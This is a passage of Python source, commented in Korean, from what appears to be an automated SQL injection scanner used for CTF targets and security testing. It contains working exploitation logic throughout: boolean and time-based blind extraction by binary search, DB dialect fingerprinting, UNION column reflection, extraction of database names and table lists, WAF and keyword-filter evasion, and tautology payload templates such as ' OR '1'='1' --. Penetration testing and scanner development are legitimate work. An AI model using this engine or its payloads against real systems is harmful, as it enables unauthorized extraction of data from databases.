            idx = self._binary_search(lambda i: oracle(self._cmp_gt(surface, char_expr, self.BLIND_CHARSET[i])),
                                       0, len(self.BLIND_CHARSET) - 1)
            if idx is None:
                print(f"    [{label}] {pos}번째 글자 확인 실패 — 여기까지만 추출: {result!r}")
                return result or None
            ch = chr(self.BLIND_CHARSET[idx])
            result += ch
            print(f"    [{label}] {pos}/{length}: {ch!r} → {result!r}")
        return result

    def _resolve_dialect(self, surface, base_fields, injection_prefix: str, comment: str,
                          ref_true_text: str, ref_false_text: str,
                          waf_hits: list, waf_evasions: list,
                          known_db: str | None = None) -> str | None:
        """에러 메시지도 안 보이고 SLEEP도 못 쓰는(또는 아직 안 한) blind 상황에서, 참/거짓
        오라클만으로 DB 방언(SQLite/MySQL/PostgreSQL)을 알아낸다.

        known_db(이미 채워진 vuln_entry['detected_db'] — 숫자형 경로의 dialect 판별,
        _resolve_dialect_for_union의 사전 판별, 또는 UNION 추출 성공 시 기록된 값)가
        SQL_DIALECTS에 있는 이름이면 그걸 그대로 재사용하고 요청을 전혀 안 보낸다 —
        이미 한 번 판별이 끝난 필드는 다시 물을 필요가 없다. 없거나(아직 아무 경로도
        방언을 못 정한 경우) 우리 방언 테이블에 없는 값('Unknown'/'MSSQL'/'Oracle')이면
        직접 프로빙한다. (이 함수 자체가 예전 _fingerprint_db(raw 길이+AND-LIKE)를 대체한
        견고한 오라클 기반 판별이다.)

        각 방언의 version_fn으로 "항상 참"/"항상 거짓" 조건을 만들어 실제로 참/거짓이
        갈리는지 본다 — 방언이 틀리면 그 함수가 없어서 쿼리 자체가 깨져 두 probe가 같은
        (에러) 응답으로 뭉개지고, 방언이 맞으면 참/거짓이 정상적으로 갈린다. 필드당 한 번만
        하고 결과를 캐싱한다.
        """
        key = (surface.url, surface.param)
        cached = self._dialect_cache.get(key)
        if cached:
            return cached

        if known_db:
            clean = known_db.replace(' (추정)', '').strip()
            if clean in SQL_DIALECTS:
                print(f"    [Blind] 방언 판별: {clean} (이미 확정된 detected_db 재사용, 추가 요청 없음)")
                self._dialect_cache[key] = clean
                return clean

        for dialect in DIALECT_PROBE_ORDER:
            version_fn = SQL_DIALECTS[dialect]['version_fn']
            is_true = self._bool_oracle(
                surface, base_fields, injection_prefix, comment, self._cmp_gt(surface, f"LENGTH({version_fn})", 0),
                ref_true_text, ref_false_text, waf_hits, waf_evasions, dialect=dialect,
            )
            is_false = self._bool_oracle(
                surface, base_fields, injection_prefix, comment, self._cmp_gt(surface, f"LENGTH({version_fn})", 99999),
                ref_true_text, ref_false_text, waf_hits, waf_evasions, dialect=dialect,
            )
            if is_true is True and is_false is False:
                print(f"    [Blind] 방언 판별: {dialect} (참/거짓 오라클로 확인)")
                self._dialect_cache[key] = dialect
                return dialect
        print(f"    [Blind] 방언 판별 실패 — SQLite/MySQL/PostgreSQL 중 어느 것도 안 맞음")
        return None

    def _resolve_dialect_for_union(self, surface, base_fields, injection_prefix: str, comment: str,
                                    vuln_entry: dict, waf_hits: list, waf_evasions: list,
                                    page_noise: int) -> None:
        """UNION 추출 직전에 방언을 확정해 vuln_entry['detected_db']에 채운다 — 예전 _fingerprint_db
        (raw 길이 + AND-LIKE, 취약)를 대체한다. _blind_extract_boolean과 동일하게 OR (1=1)/(1=2)로
        기준 텍스트를 잡아 content 오라클이 성립할 때만(캘리브레이션 diff ≥ 노이즈 문턱) _resolve_dialect
        로 판별하고, 아니면 조용히 넘어간다(UNION은 기본 브랜치로 시도 → 성공 브랜치를 _go_union_extract
        가 기록). blind로 넘어가는 경우 _resolve_dialect 캐시를 그대로 재사용한다."""
        t_status, t_body, _, _, _ = self._send_evading(
            surface, base_fields, f"{injection_prefix} OR (1=1) LIMIT 1 {comment} ", 'dialect(calib-true)', waf_hits, waf_evasions,
        )
        f_status, f_body, _, _, _ = self._send_evading(
            surface, base_fields, f"{injection_prefix} OR (1=2) LIMIT 1 {comment} ", 'dialect(calib-false)', waf_hits, waf_evasions,
        )
        if t_status is None or f_status is None:
            return
        ref_true_text, ref_false_text = visible_text(t_body), visible_text(f_body)
        if diff_score(ref_true_text, ref_false_text) < max(page_noise * 2, 1):
            return  # content 오라클 미성립 — UNION 기본 브랜치로 두고 방언 판별 스킵
        dialect = self._resolve_dialect(surface, base_fields, injection_prefix, comment,
                                         ref_true_text, ref_false_text, waf_hits, waf_evasions,
                                         known_db=vuln_entry.get('detected_db'))
        if dialect:
            vuln_entry['detected_db'] = dialect

    def _blind_extract_boolean(self, surface, base_fields, injection_prefix: str, comment: str, expr: str | None,
                                waf_hits: list, waf_evasions: list,
                                known_db: str | None = None, page_noise: int = 0) -> tuple[str | None, str | None]:
        """참/거짓 오라클 + 이진 탐색으로 expr 값을 문자 단위로 뽑아낸다.

        expr=None이면 "현재 DB명을 뽑아라"라는 뜻으로 해석한다 — 캘리브레이션 직후 DB
        방언(SQLite/MySQL/PostgreSQL)을 먼저 판별해서, 그 방언의 current_db 표현식을
        찾아 쓴다. SQLite처럼 현재 DB명 개념이 없는 방언이면 방언만 확정하고 이 단계는
        스킵한다(추출값 None, 방언은 반환). expr에 구체적 SQL 표현식을 직접 넘기면
        그대로 사용하되, 문자 추출엔 여전히 판별된 방언의 ord_fn/substr_fn을 쓴다.

        known_db는 그대로 _resolve_dialect에 넘겨서, 이미 확정된 DB가 있으면 재프로빙을
        건너뛴다.

        반환값: (추출된 문자열 또는 None, 판별된 DB 방언 이름 또는 None).
        """
        # page_noise(페이지 요청별 흔들림)는 run()의 멱등성 프로브가 엔드포인트당 한 번 재서
        # 넘겨준 값이라 여기서 또 측정하지 않는다. 바닥값을 5가 아니라 1로 두는 건 ORDER BY
        # 판별과 같은 이유 — 짧은 응답에선 진짜 참/거짓 신호도 diff가 5 미만일 수 있어서다.
        # (실패 판정 calib_diff < noise_threshold는 경계값을 통과시키는 방향이라 그대로 둔다.)
        noise_threshold = max(page_noise * 2, 1)

        # 캘리브레이션 — 원본값을 몰라도, 항상 참/거짓인 상수 조건으로 기준 텍스트를 잡는다.
        t_status, t_body, _, _, _ = self._send_evading(
            surface, base_fields, f"{injection_prefix} OR (1=1) LIMIT 1 {comment} ", 'blind(calib-true)', waf_hits, waf_evasions,
        )
        f_status, f_body, _, _, _ = self._send_evading(
            surface, base_fields, f"{injection_prefix} OR (1=2) LIMIT 1 {comment} ", 'blind(calib-false)', waf_hits, waf_evasions,
        )
        if t_status is None or f_status is None:
            return None, None
        ref_true_text, ref_false_text = visible_text(t_body), visible_text(f_body)
        calib_diff = diff_score(ref_true_text, ref_false_text)
        if calib_diff < noise_threshold:
            print(f"    [Blind] 캘리브레이션 실패 — 참/거짓 응답 차이 {calib_diff}자가 페이지 노이즈 문턱 "
                  f"{noise_threshold}자보다 작아 추출 신뢰 불가")
            return None, None
        print(f"    [Blind] 캘리브레이션: diff={calib_diff}자 (noise={page_noise}, threshold={noise_threshold})")

        dialect = self._resolve_dialect(surface, base_fields, injection_prefix, comment,
                                         ref_true_text, ref_false_text, waf_hits, waf_evasions,
                                         known_db=known_db)
        if dialect is None:
            return None, None
        oracle = lambda cond: self._bool_oracle(
            surface, base_fields, injection_prefix, comment, cond,
            ref_true_text, ref_false_text, waf_hits, waf_evasions, dialect=dialect,
        )
        result = self._extract_with_oracle(surface, oracle, dialect, expr, 'Blind')
        return result, dialect

    # ── Blind(Time) 이진 탐색 추출 ────────────────────────────────────────────

    @staticmethod
    def _timed_expr(timefn: str, seconds: int, benchmark_n: int, run: bool) -> str:
        """run=True면 지연을, False면 즉시(0) 반환하는 표현식을 만든다. benchmark는 SLEEP
        같은 지연 함수를 막는 필터를 CPU 반복 연산으로 우회한다(이 세션의 드림핵 타깃이 SLEEP은
        무력화하고 BENCHMARK만 통한 사례처럼)."""
        if timefn == 'sleep':
            return f"SLEEP({seconds})" if run else "0"
        if timefn == 'benchmark':
            return f"BENCHMARK({benchmark_n},MD5(1))" if run else "0"
        if timefn == 'pg_sleep':
            return f"pg_sleep({seconds})" if run else "pg_sleep(0)"
        return "0"

    def _time_oracle(self, surface, base_fields, injection_prefix: str, comment: str, condition: str,
                     profile: tuple, seconds: int, benchmark_n: int, threshold: float,
                     waf_hits: list, waf_evasions: list) -> bool | None:
        """condition이 참일 때만 DB가 지연되도록(IF/CASE로 지연함수를 조건부 실행) 만들어,
        응답 시간으로 참/거짓을 판정한다 — 본문이 필터로만 갈려 content 오라클을 못 쓰는 순수
        time-based에서 유일한 추출 수단.

        중요(무행/side-effect-free): 오라클 페이로드는 절대 '행을 반환하면 안 된다'. 로그인 폼
        WHERE에 `OR (SELECT 1 ...)`처럼 참이 되는 값을 넣으면 행이 반환돼, 앱이 로그인 성공으로
        처리하거나(더블체크/리셋/잠금/로깅 등) 심지어 데이터를 바꾸는 부작용이 생긴다(실측:
        reset_db는 인젝션이 행을 반환할 때마다 admin 비번을 리셋해 추출 자체를 자멸시켰다).
        BENCHMARK/SLEEP은 둘 다 '0'을 반환하므로 `IF(cond, 지연, 0)`의 값은 항상 0이다. 이를
        파생 테이블 (SELECT IF(...))x로 감싸 한 번만 materialize하고(행마다 반복 평가 방지 —
        맨 스칼라로 넣으면 행 수만큼 곱해져 타임아웃남), 바깥을 SELECT 0으로 해 값 0 → `OR 0`이라
        '행을 반환하지 않게' 한다(로그인 폼의 리셋/로그인/잠금 부작용 방지). 관찰되는 건 지연뿐.
        반환: 지연됨(참)/안 됨(거짓)/요청 실패(None)."""
        dialect, conn, timefn = profile
        run_expr  = self._timed_expr(timefn, seconds, benchmark_n, True)
        zero_expr = self._timed_expr(timefn, seconds, benchmark_n, False)
        if dialect == 'PostgreSQL':
            # (미검증) pg_sleep은 void 반환이라 무행(값 0)으로 만들기 까다로워 기존 형태 유지.
            inner = f"CASE WHEN ({condition}) THEN {run_expr} ELSE {zero_expr} END"
            payload = f"{injection_prefix} {conn} (SELECT 1 FROM (SELECT {inner})x) {comment} "
        else:  # MySQL — 파생 테이블(run-once) + SELECT 0(무행): 'OR 0' → 행 미반환, 지연 1회
            body_expr = f"(SELECT 0 FROM (SELECT IF(({condition}),{run_expr},{zero_expr}))x)"
            payload = f"{injection_prefix} {conn} {body_expr} {comment} "
        status, _, elapsed, _, _ = self._send_evading(
            surface, base_fields, payload, 'blind-time(oracle)', waf_hits, waf_evasions,
            timeout=self.TIME_TIMEOUT, dialect=dialect,
        )
        if status is None:
            return None
        return elapsed >= threshold

    def _blind_extract_time(self, surface, base_fields, injection_prefix: str, comment: str, expr: str | None,
                             profile: tuple, attack_time: float | None,
                             waf_hits: list, waf_evasions: list) -> tuple[str | None, str | None]:
        """시간 오라클 + 이진 탐색으로 expr 값을 문자 단위로 뽑는다. content가 안 통하는 순수
        time-based용. profile=(방언, 연결어, 시간함수) — time 탐지가 이미 확정한 값이라 방언
        재판별이 필요 없다.

        반환: (추출 문자열 또는 None, 방언 이름)."""
        dialect, conn, timefn = profile
        if dialect not in SQL_DIALECTS:
            print(f"    [Blind-Time] {dialect}는 문자 추출 방언 테이블(SQL_DIALECTS)에 없어 시간 기반 추출 미지원")
            return None, dialect

        seconds = 2
        # benchmark는 걸리는 시간이 N·CPU 속도에 좌우된다 — 탐지 때 측정된 지연(attack_time)으로
        # N을 역산해, TRUE 한 번이 대략 seconds초가 되게 맞춘다(너무 길면 문자당 수 초라 하세월).
        benchmark_n = 20000000
        if timefn == 'benchmark' and attack_time and attack_time > 0.5:
            benchmark_n = max(2000000, int(20000000 * seconds / attack_time))

        base_times = []
        for _ in range(2):
            st, _, el = self._send(surface, dict(base_fields), timeout=self.TIME_TIMEOUT)
            if st is not None:
                base_times.append(el)
        baseline = sum(base_times) / len(base_times) if base_times else 0.3
        threshold = baseline + max(1.0, seconds * 0.5)

        def _oracle(cond):
            return self._time_oracle(surface, base_fields, injection_prefix, comment, cond,
                                     profile, seconds, benchmark_n, threshold, waf_hits, waf_evasions)

        # 캘리브레이션 — 항상참(1=1)은 지연되고 항상거짓(1=2)은 정상이어야 시간 오라클을 신뢰한다.
        slow = _oracle('1=1')
        fast = _oracle('1=2')
        if slow is not True or fast is not False:
            print(f"    [Blind-Time] 시간 오라클 캘리브레이션 실패 (1=1 지연?={slow}, 1=2 정상?={fast}) — 추출 불가")
            return None, dialect
        print(f"    [Blind-Time] 캘리브레이션 OK — baseline≈{baseline:.2f}s, threshold={threshold:.2f}s, "
              f"지연식={self._timed_expr(timefn, seconds, benchmark_n, True)}")

        result = self._extract_with_oracle(surface, _oracle, dialect, expr, 'Blind-Time')
        return result, dialect

    @staticmethod
    def _dialect_bytes_literal(dialect: str | None, raw: bytes) -> str:
        """방언에 안전하게 raw 바이트열을 나타내는 SQL 표현식을 만든다.

        MySQL은 0x{hex}(hex 문자열 리터럴)가 그 자체로 문자열 취급이라 그대로 쓰면 되지만,
        SQLite에서 0x...는 16진수 '정수' 리터럴이라(||로 이어붙이면 10진수 텍스트가 돼버려서
        원하는 바이트가 안 나옴) char()로 문자 코드를 직접 만들어야 한다.

        SQLite의 char()는 원래 char(a,b,c,...)처럼 여러 코드를 한 번에 받을 수 있지만,
        일부러 한 글자씩(char(a), char(b), ...) 나눠서 ||로 체이닝한다 — baby-sqlite처럼
        콤마 자체를 통째로 필터링하는 사이트(UNION 컬럼 목록뿐 아니라 함수 인자 사이 콤마도
        막힘, 실측 확인됨)에서는 char(a,b,c) 안의 콤마조차 걸리기 때문이다. PostgreSQL의
        chr()는 애초에 한 글자만 받아서 원래도 이 방식이 필요했다 — 두 방언을 같은 로직으로
        통일한다. dialect가 안 정해졌으면 기존 동작(MySQL hex 리터럴)을 그대로 유지한다.
        """
        clean = (dialect or '').replace(' (추정)', '').strip()
        if clean == 'SQLite':
            return '||'.join(f"char({b})" for b in raw)
        if clean == 'PostgreSQL':
            return '||'.join(f"chr({b})" for b in raw)
        return f"0x{raw.hex()}"

    @staticmethod
    def _dialect_concat(dialect: str | None, parts: list[str]) -> str:
        """방언에 맞게 여러 SQL 표현식 조각을 문자열로 이어붙이는 식을 만든다.

        MySQL의 CONCAT()은 가변 인자라 그대로 넣으면 되지만, SQLite/PostgreSQL은 (구버전
        호환을 위해 CONCAT() 대신) 어디서나 되는 ||로 체이닝한다. dialect가 안 정해졌으면
        기존 동작(MySQL CONCAT)을 그대로 유지한다.
        """
        clean = (dialect or '').replace(' (추정)', '').strip()
        if clean in ('SQLite', 'PostgreSQL'):
            return '||'.join(parts)
        return f"CONCAT({','.join(parts)})"

    def _go_union_reflect(self, surface, base_fields, col_count, comment, vuln_entry: dict,
                           injection_prefix: str, waf_hits: list, waf_evasions: list) -> None:
        """각 컬럼 위치에 마커를 넣어 어느 컬럼이 화면에 반사되는지 찾는다.

        마커를 리터럴 문자열('sqli7e7esqli')로 그냥 박아넣으면, 이 앱처럼 입력받은 쿼리
        원문을 디버깅용으로 그대로 echo하는 사이트에서는 실제 어느 컬럼이 반사되는지와
        무관하게 "일단 페이로드에 그 글자가 들어있으니" 무조건 매치되는 오탐이 생긴다.
        _go_union_extract가 0x7e7e 같은 hex 리터럴을 쓰는 것과 같은 이유로, 여기서도
        CONCAT(hex, hex)로 쪼개서 넣는다 — 실행 전 원문에는 마커 문자열이 존재하지 않고,
        실제로 SELECT되어 화면에 반사됐을 때만 CONCAT 결과로 완성된다.

        반사 안 시킬 나머지 컬럼은 _go_union_extract와 동일하게 NULL로 채운다 — 예전엔
        ''(빈 문자열)를 썼는데, PostgreSQL처럼 UNION 컬럼 타입을 엄격히 맞추는 DB에서 실제
        컬럼이 숫자/날짜 타입이면 문자열 리터럴이 타입 불일치 에러를 내서 UNION 전체가
        깨질 수 있다. NULL은 타입이 없어 어떤 컬럼 타입에도 맞춰지므로 더 안전하다.
        """
        key = (surface.url, surface.param)
        dialect = vuln_entry.get('detected_db')
        marker_bytes = self.UNION_MARKER.encode()
        marker_half = len(marker_bytes) // 2
        marker_hex_expr = self._dialect_concat(dialect, [
            self._dialect_bytes_literal(dialect, marker_bytes[:marker_half]),
            self._dialect_bytes_literal(dialect, marker_bytes[marker_half:]),
        ])
        reflect_col = None
        reflect_payload = None
        # ORDER BY는 이미 quote_char로 성공했을 수 있는 다른 모양(shape)의 페이로드라, 그게
        # 통과했다고 UNION SELECT도 통과한다는 보장은 없다 — 그래서 여기서도 boolean/error-time
        # 과 같은 원칙으로, 첫 컬럼 시도는 self._quote_signal 값과 무관하게 반드시 직접 해보고
        # '그것도' 막혔을 때만(기존 증거 + 이 단계 자체 확인, 두 증거가 겹칠 때만) 나머지
        # 컬럼을 스킵한다.
        union_quote_hopeless = False
        for col_idx in range(1, col_count + 1):
            if union_quote_hopeless:
                continue  # UNION SELECT 모양도 우회 불가로 이미 확인됨 — 요청 없이 스킵
            cols = ['NULL'] * col_count
            cols[col_idx - 1] = marker_hex_expr
            payload = f"{injection_prefix} UNION SELECT {','.join(cols)} {comment}"
            status, body, _, used_payload, _ = self._send_evading(
                surface, base_fields, payload, f'enum(union-reflect col{col_idx})', waf_hits, waf_evasions,
            )
            if status is None and dialect == 'SQLite':
                # "select"라는 단어 자체를 필터링하는 사이트(입력을 소문자로 바꾼 뒤 부분
                # 문자열로 검사하는 baby-sqlite류)에서는 EVASION_TRANSFORMS(공백/대소문자
                # 변형)로 못 뚫는다 — SELECT라는 단어를 아예 안 쓰는 VALUES(...) 문법
                # (SQLite가 UNION의 두 번째 분기로 SELECT 대신 오래전부터 지원)으로 재시도한다.
                values_payload = f"{injection_prefix} UNION VALUES({','.join(cols)}) {comment}"
                status, body, _, used_payload, _ = self._send_evading(
                    surface, base_fields, values_payload, f'enum(union-reflect-values col{col_idx})',
                    waf_hits, waf_evasions,
                )
            if status is None:
                if not union_quote_hopeless and self._quote_signal.get(key, False):
                    union_quote_hopeless = True
                    print(f"    [Enum] UNION SELECT 첫 컬럼 우회 실패(quote_char 우회 불가 이미 확인됨) "
                          f"— 나머지 컬럼은 스킵")
                continue
            if self.UNION_MARKER in body:
                reflect_col = col_idx
                reflect_payload = used_payload
                break

        vuln_entry['attack_vectors']['UNION']['reflected_column'] = reflect_col
        vuln_entry['attack_vectors']['UNION']['reflect_payload'] = reflect_payload
        if reflect_col is not None:
            self._go_union_extract(surface, base_fields, col_count, reflect_col, comment, vuln_entry,
                                    injection_prefix, waf_hits, waf_evasions)

    def _go_union_extract(self, surface, base_fields, col_count, reflect_col, comment, vuln_entry: dict,
                           injection_prefix: str, waf_hits: list, waf_evasions: list) -> None:
        """반사 컬럼을 이용해 db명과 테이블 목록을 추출한다.

        db명 개념/테이블 목록 조회 방식이 방언마다 달라서(SQLite는 파일 하나가 곧 DB라
        이름 개념이 없고 sqlite_master로 테이블을 나열하며, MySQL/PostgreSQL은
        information_schema를 쓴다) 방언별로 다른 쿼리를 쓴다. 문자열 리터럴('table',
        'public' 등)도 quote 없이 _dialect_bytes_literal로 만든다 — baby-sqlite처럼
        따옴표까지 필터링하는 사이트를 실측으로 확인했기 때문이다.
        """
        dialect = vuln_entry.get('detected_db')
        clean = (dialect or '').replace(' (추정)', '').strip()
        marker_lit = self._dialect_bytes_literal(dialect, b'~~')

        def _build(expr, use_values=False):
            cols = ['NULL'] * col_count
            cols[reflect_col - 1] = self._dialect_concat(dialect, [marker_lit, expr, marker_lit])
            keyword = 'VALUES(' if use_values else 'SELECT '
            closing = ')' if use_values else ''
            return f"{injection_prefix} UNION {keyword}{','.join(cols)}{closing} {comment}"

        if clean == 'SQLite':
            # SQLite는 current_db 개념이 없어(SQL_DIALECTS 참고) db_name 단계 자체를
            # 스킵하고 바로 테이블 목록으로 간다. sqlite_master가 MySQL의
            # information_schema.tables 역할을 한다. 단, 이 expr 자체가 sqlite_master를
            # 읽는 중첩 SELECT를 포함해서 "select" 단어 필터는 VALUES로도 못 피한다
            # (테이블을 실제로 읽으려면 SELECT가 필요해서) — 그래도 바깥쪽 UNION만이라도
            # VALUES로 바꿔두면 바깥쪽 SELECT 때문에 걸리는 경우는 구제된다.
            table_lit = self._dialect_bytes_literal(dialect, b'table')
            table_expr = f"(SELECT group_concat(name) FROM sqlite_master WHERE type={table_lit})"
            targets = [('tables', table_expr)]
        elif clean == 'PostgreSQL':
            public_lit = self._dialect_bytes_literal(dialect, b'public')
            targets = [
                ('db_name', 'current_database()'),
                ('tables', f"(SELECT string_agg(table_name,',') FROM information_schema.tables "
                           f"WHERE table_schema={public_lit})"),
            ]
        else:
            # MySQL 또는 dialect 미확정 — 기존 동작 유지
            targets = [
                ('db_name', 'database()'),
                ('tables', "(SELECT group_concat(table_name ORDER BY table_name SEPARATOR ',') "
                           "FROM information_schema.tables WHERE table_schema=database())"),
            ]

        union_info = vuln_entry['attack_vectors']['UNION']
        for label, expr in targets:
            status, body, _, used_payload, _ = self._send_evading(
                surface, base_fields, _build(expr), f'enum(union-extract:{label})', waf_hits, waf_evasions,
            )
            if status is None and clean == 'SQLite':
                # _go_union_reflect와 같은 이유 — "select" 단어 자체를 필터링하는 사이트에서는
                # 바깥쪽 UNION SELECT를 VALUES로 바꿔서 재시도한다.
                status, body, _, used_payload, _ = self._send_evading(
                    surface, base_fields, _build(expr, use_values=True), f'enum(union-extract-values:{label})',
                    waf_hits, waf_evasions,
                )
            if status is None:
                continue
            match = re.search(r'~~([^~<]{1,256})~~', body)
            print(f"    [UnionExtract] label={label} status={status} match={match and match.group(1)}")
            if match:
                # 이 추출이 성공한 브랜치의 방언 = 확정 지문. _fingerprint_db가 Unknown으로
                # 실패했어도(예: uid 동등비교라 AND 기반 버전-LIKE 판별이 참/거짓을 못 가르는
                # 앱), UNION 추출이 실제로 성공했다는 것 자체가 가장 강한 근거라 여기서
                # detected_db를 확정한다(추가 요청 0). 그래야 요약에 'DB : MySQL' 등이 뜨고,
                # blind를 안 탄 UNION 경로에서도 방언이 공란으로 남지 않는다.
                if vuln_entry.get('detected_db') in (None, 'Unknown'):
                    vuln_entry['detected_db'] = clean if clean in ('SQLite', 'PostgreSQL') else 'MySQL'
                if label == 'db_name':
                    union_info['db_name'] = match.group(1)
                    union_info['db_name_payload'] = used_payload
                else:
                    union_info['tables'] = match.group(1).split(',')
                    union_info['tables_payload'] = used_payload

    # ── 페이로드 세트 ─────────────────────────────────────────────────────────

    @staticmethod
    def _bool_cond_variants(quote_char: str) -> dict[str, tuple[list[str], list[str]]]:
        """스타일별 (항상-참 조건들, 항상-거짓 조건들). 인덱스 0은 초기 스캔에, 인덱스 1~는
        등가 클러스터 재검증에 쓴다 — 논리값은 같지만 리터럴 표기는 제각각이라, 특정 문자열에
        반응하는 필터/앱상태가 만든 콘텐츠 차이를 SQL 불리언 평가와 구분하는 데 쓴다."""
        q = quote_char
        return {
            # 숫자 컨텍스트 (bare)
            'num':        (['1=1', '2=2', '9=9'],
                           ['1=2', '3=4', '9=8']),
            # 문자열 컨텍스트, 페이로드가 따옴표를 스스로 닫음 (주석과 함께): '1'='1'
            'str_closed': ([f"{q}1{q}={q}1{q}", f"{q}a{q}={q}a{q}", f"{q}z{q}={q}z{q}"],
                           [f"{q}1{q}={q}2{q}", f"{q}a{q}={q}b{q}", f"{q}x{q}={q}y{q}"]),
            # 문자열 컨텍스트, 앱 템플릿의 뒤따르는 따옴표에 기대 닫음 (주석 없음): '1'='1
            'str_open':   ([f"{q}1{q}={q}1", f"{q}a{q}={q}a", f"{q}z{q}={q}z"],
                           [f"{q}1{q}={q}2", f"{q}a{q}={q}b", f"{q}x{q}={q}y"]),
        }

    @staticmethod
    def _build_boolean_payloads(orig_val, quote_char: str):
        """각 항목 (true_payload, false_payload, build, style):
          - true/false_payload: 초기 스캔용(조건 인덱스 0) — 기존과 동일한 12개.
          - build(cond): 같은 스캐폴드(접두사·연결어·따옴표·LIMIT·주석)에 임의의 불리언
            조건만 끼운 페이로드를 만든다. 등가 클러스터 재검증에서 리터럴만 바꾼 변형을
            생성하는 데 쓴다.
          - style: build에 넣을 조건을 _bool_cond_variants의 어느 형식에서 뽑을지."""
        orig = str(orig_val)
        q = quote_char
        # (build, style) — build의 {c} 자리에 스타일에 맞는 조건이 들어간다.
        templates = [
            (lambda c: f"{q} AND {c}",            'str_open'),    # ' AND '1'='1
            (lambda c: f"{q} OR {c} --",          'str_closed'),  # ' OR '1'='1' --
            (lambda c: f"{q} OR {c} #",           'str_closed'),
            (lambda c: f"%{q} AND {c} --",        'num'),         # %' AND 1=1 --
            (lambda c: f"%{q} OR {c} LIMIT 1 --", 'num'),
            (lambda c: f"%{q} AND {c} #",         'num'),
            (lambda c: f"%{q} OR {c} LIMIT 1 #",  'num'),
            (lambda c: f"{orig} AND {c}",         'num'),         # 원본 값 기반
            (lambda c: f"{orig}{q} AND {c}",      'str_open'),
            (lambda c: f"{orig}%{q} AND {c} --",  'num'),
            (lambda c: f"{orig}%{q} OR {c} --",   'num'),
            (lambda c: f"{orig}%{q} AND {c} #",   'num'),
        ]
        variants = SQLiStrategy._bool_cond_variants(q)
        out = []
        for build, style in templates:
            true_c0, false_c0 = variants[style][0][0], variants[style][1][0]
            out.append((build(true_c0), build(false_c0), build, style))
        return out

    # ── 결과 변환 ────────────────────────────────────────────────────────────

    def _to_vuln_result(self, surface: AttackSurface, vuln_entry: dict) -> VulnResult:
        av = vuln_entry.get('attack_vectors', {})
        union = av.get('UNION', {})
        # UNION/blind(boolean)/blind(time) 어느 경로로든 실제 데이터(db명 등)를 뽑아냈으면,
        # 그 자체가 확실한 증거라 애초 탐지가 약한 신호였어도 CRITICAL로 올린다.
        extracted_db = (union.get('db_name')
                        or av.get('blind_boolean', {}).get('db_name')
                        or av.get('blind_time', {}).get('db_name'))
        if union.get('db_name') or union.get('tables') or extracted_db:
            severity = 'CRITICAL'
        elif vuln_entry.get('evidence_kind') == 'status':
            # boolean/error(본문)/time 중 어느 것도 확정 못 하고 상태코드 변화 하나로만
            # 채택된 의심 신호 — SQLi로 확정된 게 아니라 HIGH로 보고하면 과장이다.
            severity = 'INFO'
        else:
            severity = 'HIGH'

        payload = vuln_entry.get('payload') or vuln_entry.get('true_payload', '')
        evidence_bits = [vuln_entry['type']]
        if vuln_entry.get('detected_db'):
            evidence_bits.append(f"db={vuln_entry['detected_db']}")
        if union.get('columns'):
            evidence_bits.append(f"union_columns={union['columns']}")
        if extracted_db:
            evidence_bits.append(f"extracted_db={extracted_db}")
        if union.get('tables'):
            evidence_bits.append(f"tables={len(union['tables'])}개")

        return VulnResult(
            surface=surface,
            vuln_type='SQLi',
            severity=severity,
            payload=payload,
            evidence=' | '.join(evidence_bits),
            detail=vuln_entry,
        )
